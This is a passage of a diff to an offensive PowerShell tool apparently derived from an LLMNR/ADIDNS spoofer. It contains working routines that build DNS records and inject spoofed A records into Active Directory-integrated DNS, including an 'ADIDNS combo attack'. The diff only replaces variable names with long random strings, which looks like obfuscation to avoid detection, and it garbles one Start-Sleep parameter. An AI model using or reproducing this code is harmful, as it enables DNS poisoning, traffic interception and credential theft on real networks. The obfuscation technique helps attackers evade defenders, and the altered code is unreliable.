+            [parameter(Mandatory=$false)][ValidateSet("A","AAAA","CNAME","DNAME","MX","NS","PTR","SRV","TXT")][String]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa = "A",
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
+            [parameter(Mandatory=$false)][Int]$sNnieDVGuYezMXNPmzlJOAsC,
+            [parameter(Mandatory=$false)][Int]$ykWVeBgbgsPczeylzrVhzDoRysaBlvPWKTLEA,
+            [parameter(Mandatory=$false)][Int]$fkpHmWAZEwLJIUFLssheiYzzhfVmTnDCXfsXOvJVO,
+            [parameter(Mandatory=$false)][Int]$lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ,
+            [parameter(Mandatory=$false)][Int]$SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW = 600,
+            [parameter(Mandatory=$false)][Int32]$FTnzKOAOPyVPZKofOcmmcHtKicxIFwhIXIbYFrKUglZ,
+            [parameter(Mandatory=$false)][Switch]$UaXElPjqMzcUmnMeccjrezf,
+            [parameter(ValueFromRemainingArguments=$true)]$jpNTCIxGJBVtjEdXzPhc
         )
 
-        $DonkeyFrail = New-DonkeyFrail -TrickWander $TrickWander -PersonCheer $PersonCheer
+        $OsmYZXCshtqjAUQpMNVOdOrwX = New-OsmYZXCshtqjAUQpMNVOdOrwX -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
 
         function New-DNSNameArray
         {
             param([String]$Name)
 
-            $NormalArch = $Name.ToCharArray()
-            [Array]$MoveTicket = 0..($NormalArch.Count - 1) | Where-Object {$NormalArch[$_] -eq '.'}
+            $sQdYCRWsaGoRktLrhDbRNwdbRGxJPlC = $Name.ToCharArray()
+            [Array]$iycdwAwfCpuxiXcgBLLhZCpahkJDcIiYk = 0..($sQdYCRWsaGoRktLrhDbRNwdbRGxJPlC.Count - 1) | Where-Object {$sQdYCRWsaGoRktLrhDbRNwdbRGxJPlC[$_] -eq '.'}
 
-            if($MoveTicket.Count -gt 0)
+            if($iycdwAwfCpuxiXcgBLLhZCpahkJDcIiYk.Count -gt 0)
             {
 
                 $name_start = 0
 
-                foreach($ElatedCent in $MoveTicket)
+                foreach($anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF in $iycdwAwfCpuxiXcgBLLhZCpahkJDcIiYk)
                 {
-                    $name_end = $ElatedCent - $name_start
+                    $name_end = $anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF - $name_start
                     [Byte[]]$name_array += $name_end
                     [Byte[]]$name_array += [System.Text.Encoding]::UTF8.GetBytes($Name.Substring($name_start,$name_end))
-                    $name_start = $ElatedCent + 1
+                    $name_start = $anNJLGboCWKnSbsCeiadJchPOCrWMOjcGEkhAWF + 1
                 }
 
                 [Byte[]]$name_array += ($Name.Length - $name_start)
@@ -2347,121 +2347,121 @@ $StreetFound =
             return $name_array
         }
 
-        switch ($EarBucket)
+        switch ($NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa)
         {
 
             'A'
             {
-                [Byte[]]$FlightNeedle = 0x01,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes(($IckyBloody.Split(".")).Count))[0..1]
-                [Byte[]]$NoteEar += ([System.Net.IPAddress][String]([System.Net.IPAddress]$IckyBloody)).GetAddressBytes()
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x01,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes(($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Split(".")).Count))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ([System.Net.IPAddress][String]([System.Net.IPAddress]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE)).GetAddressBytes()
             }
 
             'AAAA'
             {
-                [Byte[]]$FlightNeedle = 0x1c,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes(($IckyBloody -replace ":","").Length / 2))[0..1]
-                [Byte[]]$NoteEar += ([System.Net.IPAddress][String]([System.Net.IPAddress]$IckyBloody)).GetAddressBytes()
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x1c,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes(($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE -replace ":","").Length / 2))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ([System.Net.IPAddress][String]([System.Net.IPAddress]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE)).GetAddressBytes()
             }
             
             'CNAME'
             {
-                [Byte[]]$FlightNeedle = 0x05,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
-                [Byte[]]$NoteEar = $IckyBloody.Length + 2
-                $NoteEar += ($IckyBloody.Split(".")).Count
-                $NoteEar += New-DNSNameArray $IckyBloody
-                $NoteEar += 0x00
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x05,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 4))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf = $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 2
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Split(".")).Count
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += New-DNSNameArray $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += 0x00
             }
 
             'DNAME'
             {
-                [Byte[]]$FlightNeedle = 0x27,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
-                [Byte[]]$NoteEar = $IckyBloody.Length + 2
-                $NoteEar += ($IckyBloody.Split(".")).Count
-                $NoteEar += New-DNSNameArray $IckyBloody
-                $NoteEar += 0x00
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x27,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 4))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf = $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 2
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Split(".")).Count
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += New-DNSNameArray $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += 0x00
             }
             
             'MX'
             {
-                [Byte[]]$FlightNeedle = 0x0f,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 6))[0..1]
-                [Byte[]]$NoteEar = [System.Bitconverter]::GetBytes($OvertKnit)[1,0]
-                $NoteEar += $IckyBloody.Length + 2
-                $NoteEar += ($IckyBloody.Split(".")).Count
-                $NoteEar += New-DNSNameArray $IckyBloody
-                $NoteEar += 0x00
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x0f,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 6))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf = [System.Bitconverter]::GetBytes($sNnieDVGuYezMXNPmzlJOAsC)[1,0]
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 2
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Split(".")).Count
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += New-DNSNameArray $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += 0x00
             }
 
             'NS'
             {
-                [Byte[]]$FlightNeedle = 0x02,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
-                [Byte[]]$NoteEar = $IckyBloody.Length + 2
-                $NoteEar += ($IckyBloody.Split(".")).Count
-                $NoteEar += New-DNSNameArray $IckyBloody
-                $NoteEar += 0x00
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x02,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 4))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf = $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 2
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Split(".")).Count
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += New-DNSNameArray $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += 0x00
             }
 
             'PTR'
             {
-                [Byte[]]$FlightNeedle = 0x0c,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 4))[0..1]
-                [Byte[]]$NoteEar = $IckyBloody.Length + 2
-                $NoteEar += ($IckyBloody.Split(".")).Count
-                $NoteEar += New-DNSNameArray $IckyBloody
-                $NoteEar += 0x00
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x0c,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 4))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf = $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 2
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Split(".")).Count
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += New-DNSNameArray $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += 0x00
             }
 
             'SRV'
             {
-                [Byte[]]$FlightNeedle = 0x21,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 10))[0..1]
-                [Byte[]]$NoteEar = [System.Bitconverter]::GetBytes($FemalePush)[1,0]
-                $NoteEar += [System.Bitconverter]::GetBytes($CobwebNeedle)[1,0]
-                $NoteEar += [System.Bitconverter]::GetBytes($SlipPorter)[1,0]
-                $NoteEar += $IckyBloody.Length + 2
-                $NoteEar += ($IckyBloody.Split(".")).Count
-                $NoteEar += New-DNSNameArray $IckyBloody
-                $NoteEar += 0x00
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x21,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 10))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf = [System.Bitconverter]::GetBytes($ykWVeBgbgsPczeylzrVhzDoRysaBlvPWKTLEA)[1,0]
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += [System.Bitconverter]::GetBytes($fkpHmWAZEwLJIUFLssheiYzzhfVmTnDCXfsXOvJVO)[1,0]
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += [System.Bitconverter]::GetBytes($lyBceglOUxojIJcWfJXdIrHkrTxJoyYtvaYwJcHIJ)[1,0]
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 2
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += ($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Split(".")).Count
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += New-DNSNameArray $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += 0x00
             }
 
             'TXT'
             {
-                [Byte[]]$FlightNeedle = 0x10,0x00
-                [Byte[]]$RabbitEmploy = ([System.BitConverter]::GetBytes($IckyBloody.Length + 1))[0..1]
-                [Byte[]]$NoteEar = $IckyBloody.Length
-                $NoteEar += [System.Text.Encoding]::UTF8.GetBytes($IckyBloody)
+                [Byte[]]$AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos = 0x10,0x00
+                [Byte[]]$WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO = ([System.BitConverter]::GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length + 1))[0..1]
+                [Byte[]]$ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf = $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE.Length
+                $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf += [System.Text.Encoding]::UTF8.GetBytes($eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE)
             }
 
         }
         
-        [Byte[]]$RabbitStreet = [System.BitConverter]::GetBytes($LethalArrive)
-        [Byte[]]$PlacidHorn = $RabbitEmploy +
-            $FlightNeedle +
+        [Byte[]]$kAMZrUpECfiiAjjPKCrOw = [System.BitConverter]::GetBytes($SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW)
+        [Byte[]]$wILwyAWERJysCSQwSXsoSEncmrDAGBbs = $WJxyhhWVJoNDQIHIFwTjgLYLXzwyrfKHHTPCmBSTEreO +
+            $AjsJdowCseEuvJWpaiXLERdpNtRThzsJiJqojos +
             0x05,0xF0,0x00,0x00 +
-            $DonkeyFrail[0..3] +
-            $RabbitStreet[3..0] +
+            $OsmYZXCshtqjAUQpMNVOdOrwX[0..3] +
+            $kAMZrUpECfiiAjjPKCrOw[3..0] +
             0x00,0x00,0x00,0x00
 
-        if($NailMixed)
+        if($UaXElPjqMzcUmnMeccjrezf)
         {
-            $PlacidHorn += 0x00,0x00,0x00,0x00
+            $wILwyAWERJysCSQwSXsoSEncmrDAGBbs += 0x00,0x00,0x00,0x00
         }
         else
         {
-            $KnockHusky = [Int64](([Datetime]::UtcNow)-(Get-Date "1/1/1601")).TotalHours
-            $KnockHusky = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($KnockHusky))
-            $KnockHusky = $KnockHusky.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
-            $KnockHusky = $KnockHusky[0..3]
-            $PlacidHorn += $KnockHusky
+            $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz = [Int64](([Datetime]::UtcNow)-(Get-Date "1/1/1601")).TotalHours
+            $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz))
+            $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz = $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz.Split("-") | ForEach-Object{[System.Convert]::ToInt16($_,16)}
+            $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz = $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz[0..3]
+            $wILwyAWERJysCSQwSXsoSEncmrDAGBbs += $JNVNQMwcSAgJIaPBLlXjFpQKFFJfaz
         }
         
-        $PlacidHorn += $NoteEar
+        $wILwyAWERJysCSQwSXsoSEncmrDAGBbs += $ndoAcIXbZQxKntmbrbeajyESNNZDQvLJdf
 
-        return ,$PlacidHorn
+        return ,$wILwyAWERJysCSQwSXsoSEncmrDAGBbs
     }
 
     function Invoke-ADIDNSSpoofer
@@ -2469,29 +2469,29 @@ $StreetFound =
         [CmdletBinding()]
         param
         (
-            [parameter(Mandatory=$false)][String]$IckyBloody,
-            [parameter(Mandatory=$false)][String]$DesireUnique,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$false)][String]$RipeYoke,
-            [parameter(Mandatory=$true)][String]$FilmJazzy,
-            [parameter(Mandatory=$false)][String]$CauseYoke,
-            [parameter(Mandatory=$false)][String]$EarBucket,
-            [parameter(Mandatory=$false)][String]$PersonCheer,
-            [parameter(Mandatory=$false)][Int]$LethalArrive,
+            [parameter(Mandatory=$false)][String]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE,
+            [parameter(Mandatory=$false)][String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$false)][String]$VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP,
+            [parameter(Mandatory=$true)][String]$ifczfhVhxXUsXrLMmesQQ,
+            [parameter(Mandatory=$false)][String]$zgPBavHAgJDNXciLWtpacZIBhUFjXbA,
+            [parameter(Mandatory=$false)][String]$NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa,
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
+            [parameter(Mandatory=$false)][Int]$SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
         )
 
         try
         {
-            $MarchFork = New-ADIDNSNode -Credential $Credential -IckyBloody $IckyBloody -DesireUnique $DesireUnique -TrickWander $TrickWander -RipeYoke $RipeYoke -FilmJazzy $FilmJazzy -CauseYoke $CauseYoke -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer
+            $hnjnrnOyqksCVqbvpZXKRIZlBJaYMbaF = New-ADIDNSNode -Credential $Credential -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP $VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP -ifczfhVhxXUsXrLMmesQQ $ifczfhVhxXUsXrLMmesQQ -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $zgPBavHAgJDNXciLWtpacZIBhUFjXbA -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
 
-            if($LightOval.ADIDNS -and !$MarchFork)
+            if($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS -and !$hnjnrnOyqksCVqbvpZXKRIZlBJaYMbaF)
             {
-                $NiceShape = Get-ADIDNSNodeTombstoned -Credential $Credential -DesireUnique $DesireUnique -TrickWander $TrickWander -FilmJazzy $FilmJazzy -CauseYoke $CauseYoke -PersonCheer $PersonCheer
+                $ukdJHqumDBPVUueuKrhJFkBipOAcRGbJYi = Get-ADIDNSNodeTombstoned -Credential $Credential -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -ifczfhVhxXUsXrLMmesQQ $ifczfhVhxXUsXrLMmesQQ -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $zgPBavHAgJDNXciLWtpacZIBhUFjXbA -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
 
-                if($NiceShape)
+                if($ukdJHqumDBPVUueuKrhJFkBipOAcRGbJYi)
                 {
-                    Enable-ADIDNSNode -Credential $Credential -IckyBloody $IckyBloody -DesireUnique $DesireUnique -TrickWander $TrickWander -FilmJazzy $FilmJazzy -CauseYoke $CauseYoke -EarBucket $EarBucket -LethalArrive $LethalArrive -PersonCheer $PersonCheer
+                    Enable-ADIDNSNode -Credential $Credential -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -ifczfhVhxXUsXrLMmesQQ $ifczfhVhxXUsXrLMmesQQ -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $zgPBavHAgJDNXciLWtpacZIBhUFjXbA -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa $NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
                 }
 
             }
@@ -2501,9 +2501,9 @@ $StreetFound =
         {
             $error_message = $_.Exception.Message
             $error_message = $error_message -replace "`n",""
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-            $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS spoofer disabled due to error") > $null
-            $LightOval.ADIDNS = $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS spoofer disabled due to error") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS = $null
         }
 
     }
@@ -2513,43 +2513,43 @@ $StreetFound =
         [CmdletBinding()]
         param
         (
-            [parameter(Mandatory=$false)][Array]$MuscleFair,
-            [parameter(Mandatory=$false)][String]$IckyBloody,
-            [parameter(Mandatory=$false)][String]$DesireUnique,
-            [parameter(Mandatory=$false)][String]$TrickWander,
-            [parameter(Mandatory=$false)][String]$RipeYoke,
-            [parameter(Mandatory=$false)]$CauseYoke,
-            [parameter(Mandatory=$false)][String]$PersonCheer,
-            [parameter(Mandatory=$false)][Int]$DrainCable,
-            [parameter(Mandatory=$false)][Int]$LethalArrive,
-            [parameter(Mandatory=$false)]$IrateAnimal,
+            [parameter(Mandatory=$false)][Array]$jJuFyNBnBUrFBsyGTwEXMfPDfd,
+            [parameter(Mandatory=$false)][String]$eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE,
+            [parameter(Mandatory=$false)][String]$ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay,
+            [parameter(Mandatory=$false)][String]$oOKRVkPmhffpDSkVLIFGzJKYJ,
+            [parameter(Mandatory=$false)][String]$VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP,
+            [parameter(Mandatory=$false)]$zgPBavHAgJDNXciLWtpacZIBhUFjXbA,
+            [parameter(Mandatory=$false)][String]$SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC,
+            [parameter(Mandatory=$false)][Int]$LWGbLMgsKkBNqMwjLgBreufoI,
+            [parameter(Mandatory=$false)][Int]$SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW,
+            [parameter(Mandatory=$false)]$WVdxmmYgroyvOMdHdmZvxskAbk,
             [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential
         )
 
-        Start-Sleep -PlantsIrate 1
+        Start-Sleep -ROrCQBZQImWrggTDfyCmsOyvDtftRbMdXhwGUvOPk 1
 
-        foreach($RootSnail in $IrateAnimal.Keys)
+        foreach($irQNkPmLncuaNLHVNiMoU in $WVdxmmYgroyvOMdHdmZvxskAbk.Keys)
         {
 
-            if(($IrateAnimal.$RootSnail | Sort-Object -Unique).Count -gt $DrainCable)
+            if(($WVdxmmYgroyvOMdHdmZvxskAbk.$irQNkPmLncuaNLHVNiMoU | Sort-Object -Unique).Count -gt $LWGbLMgsKkBNqMwjLgBreufoI)
             {
 
-                if(!$LightOval.ADIDNS_table.ContainsKey($RootSnail))
+                if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.ContainsKey($irQNkPmLncuaNLHVNiMoU))
                 {
-                    $LightOval.ADIDNS_table.Add($RootSnail,"")
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.Add($irQNkPmLncuaNLHVNiMoU,"")
                 }
                 
-                if($MuscleFair -NotContains $RootSnail -and !$LightOval.ADIDNS_table.$RootSnail)
+                if($jJuFyNBnBUrFBsyGTwEXMfPDfd -NotContains $irQNkPmLncuaNLHVNiMoU -and !$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$irQNkPmLncuaNLHVNiMoU)
                 {    
-                    Invoke-ADIDNSSpoofer -Credential $Credential -IckyBloody $IckyBloody -DesireUnique $DesireUnique -TrickWander $TrickWander -RipeYoke $RipeYoke -FilmJazzy $RootSnail -CauseYoke $CauseYoke -EarBucket 'A' -LethalArrive $LethalArrive -PersonCheer $PersonCheer
+                    Invoke-ADIDNSSpoofer -Credential $Credential -eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE $eqUFMlGWflsxtSANjQFXgVjjPSlIorGwzzLQE -ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay $ftdOWSOcDehtsWbWJMmkJCJyNuiNOXANQcrKTay -oOKRVkPmhffpDSkVLIFGzJKYJ $oOKRVkPmhffpDSkVLIFGzJKYJ -VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP $VLmckwKaUbSGuBdaTXxvwvzODhZHIWAWhufWP -ifczfhVhxXUsXrLMmesQQ $irQNkPmLncuaNLHVNiMoU -zgPBavHAgJDNXciLWtpacZIBhUFjXbA $zgPBavHAgJDNXciLWtpacZIBhUFjXbA -NoSkeyVRqJIuHVrAmWumfmDGBSwlASfhVa 'A' -SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW $SHYbFZJwSEjcXEKgEXzgBUgNkNPJtqpmcyVwW -SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC $SkrokMFWPmGAsRNQbxAGIjtSPaufWWkfxjhhlyC
                 }
-                elseif($MuscleFair -Contains $RootSnail)
+                elseif($jJuFyNBnBUrFBsyGTwEXMfPDfd -Contains $irQNkPmLncuaNLHVNiMoU)
                 {
 
-                    if(!$LightOval.ADIDNS_table.$RootSnail)
+                    if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$irQNkPmLncuaNLHVNiMoU)
                     {
-                        $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS combo attack ignored $RootSnail") > $null
-                        $LightOval.ADIDNS_table.$RootSnail = 3
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS combo attack ignored $irQNkPmLncuaNLHVNiMoU") > $null
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.ADIDNS_table.$irQNkPmLncuaNLHVNiMoU = 3
                     }
 
                 }
@@ -2564,405 +2564,405 @@ $StreetFound =
 }
 
 # Microsoft".
-$OrangeMushy = 
